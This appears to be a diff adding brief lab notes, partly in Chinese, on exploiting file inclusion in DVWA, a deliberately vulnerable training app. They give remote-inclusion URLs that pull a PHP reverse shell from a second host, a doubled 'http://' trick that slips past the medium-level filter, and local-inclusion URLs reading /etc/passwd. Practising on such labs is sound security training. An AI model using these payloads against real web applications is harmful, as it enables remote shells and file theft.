@@ -1,0 +1,14 @@
+file inclusion:
+
+low:
+    RFI:
+        http://192.168.110.129/dvwa/vulnerabilities/fi/?page=http://192.168.110.128:8000/php-reverse-shell.php
+        還是可以 reverse shell的，用python -m http.server，去載它
+medium:
+    RFI:
+        http://192.168.110.129/dvwa/vulnerabilities/fi/?page=httphttp://://192.168.110.128:8000/php-reverse-shell.php
+        可以試試看寫 兩次 http://
+high:
+    LFI:
+        http://192.168.110.129/dvwa/vulnerabilities/fi/?page=file:///etc/passwd
+        http://192.168.110.129/dvwa/vulnerabilities/fi/?page=file:///var/www/html/dvwa/phpinfo.php
